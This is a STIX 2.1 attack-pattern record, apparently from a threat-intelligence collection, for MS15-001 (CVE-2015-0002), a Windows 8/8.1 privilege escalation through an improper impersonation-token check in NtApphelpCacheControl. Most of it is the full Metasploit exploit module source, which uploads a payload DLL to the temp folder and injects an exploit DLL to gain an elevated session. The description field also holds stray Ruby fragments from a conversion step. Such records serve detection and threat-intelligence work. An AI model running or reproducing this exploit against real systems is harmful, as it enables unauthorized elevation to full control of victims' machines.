{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b8384231-fa70-42fe-bd86-1cd4ac77fd77",
    "created": "2024-08-14T16:49:06.979791Z",
    "modified": "2024-08-14T16:49:06.979795Z",
    "name": "MS15-001 Microsoft Windows NtApphelpCacheControl Improper Authorization Check",
    "description": " On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys) allows application compatibility data to be cached for quick reuse when new processes are created. A normal user can query the cache but cannot add new cached entries as the operation is restricted to administrators. This is checked in the function AhcVerifyAdminContext.  This function has a vulnerability where it doesn't correctly check the impersonation token of the caller to determine if the user is an administrator. It reads the caller's impersonation token using PsReferenceImpersonationToken and then does a comparison between the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level of the token so it's possible to get an identify token on your thread from a local system process and bypass this check.  This module currently only affects Windows 8 and Windows 8.1, and requires access to C:\\Windows\\System\\ComputerDefaults.exe (although this can be improved).  'License' => MSF_LICENSE 'Notes' => { 'Stability' => [] 'SideEffects' => [] 'Reliability' => [] ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ntapphelpcachecontrol.rb",
            "external_id": "ntapphelpcachecontrol.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0002"
        },
        {
            "source_name": "reference",
            "url": "https://code.google.com/p/google-security-research/issues/detail?id=118"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Process\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'MS15-001 Microsoft Windows NtApphelpCacheControl Improper Authorization Check',\n          'Description' => %q{\n            On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys)\n            allows application compatibility data to be cached for quick reuse when new processes are\n            created. A normal user can query the cache but cannot add new cached entries as the\n            operation is restricted to administrators. This is checked in the function\n            AhcVerifyAdminContext.\n\n            This function has a vulnerability where it doesn't correctly check the impersonation token\n            of the caller to determine if the user is an administrator. It reads the caller's\n            impersonation token using PsReferenceImpersonationToken and then does a comparison between\n            the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level\n            of the token so it's possible to get an identify token on your thread from a local system\n            process and bypass this check.\n\n            This module currently only affects Windows 8 and Windows 8.1, and requires access to\n            C:\\Windows\\System\\ComputerDefaults.exe (although this can be improved).\n          },\n          'License' => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [],\n        'SideEffects' => [],\n        'Reliability' => []\n      },\n          'Author' => [\n            'James Forshaw',\n            'sinn3r'\n          ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'Arch' => [ARCH_X86, ARCH_X64],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows 8 / Windows 8.1 (x86 and x64)', {} ]\n          ],\n          'DefaultTarget' => 0,\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'MSB', 'MS15-001' ],\n            [ 'CVE', '2015-0002' ],\n          [ 'OSVDB', '116497' ],\n            [ 'EDB', '35661' ],\n            [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=118']\n          ],\n          'DisclosureDate' => '2014-09-30'\n        }\n      )\n    )\n  end\n\n  def temp\n    @temp ||= get_env('TEMP').to_s\n  end\n\n  def payload_filepath\n    @payload_filepath ||= \"#{temp}\\\\#{Rex::Text.rand_text_alpha(6)}.dll\"\n  end\n\n  def upload_payload_dll(payload_filepath)\n    payload = generate_payload_dll({ dll_exitprocess: true })\n    begin\n      write_file(payload_filepath, payload)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::Unknown, \"Error uploading file #{payload_filepath}: #{e.class} #{e}\")\n    end\n  end\n\n  def upload_payload\n    print_status(\"Payload DLL will be: #{payload_filepath}\")\n\n    # Upload the payload\n    upload_payload_dll(payload_filepath)\n    if !file?(payload_filepath)\n      fail_with(Failure::Unknown, 'Failed to save the payload DLL, or got removed. No idea why.')\n    end\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::Win8, Msf::WindowsVersion::Win81)\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if session.arch != ARCH_X86\n      print_error('Sorry, this module currently only allows x86/win32 sessions.')\n      print_error('You will have to get a x86/win32 session first, and then you can')\n      print_error(\"select a x64 payload as this exploit's payload.\")\n      return\n    end\n\n    print_status('Uploading the payload DLL')\n    upload_payload\n\n    print_status('Injecting the exploit DLL and instructing to run the payload DLL upon successful exploitation...')\n    lib_file_path = ::File.join(\n      Msf::Config.data_directory, 'exploits', 'ntapphelpcachecontrol', 'exploit.dll'\n    )\n    execute_dll(lib_file_path, payload_filepath)\n\n    print_status('You should now have an elevated session, enjoy!')\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-30",
    "x_mitre_platforms": [
        "win'"
    ]
}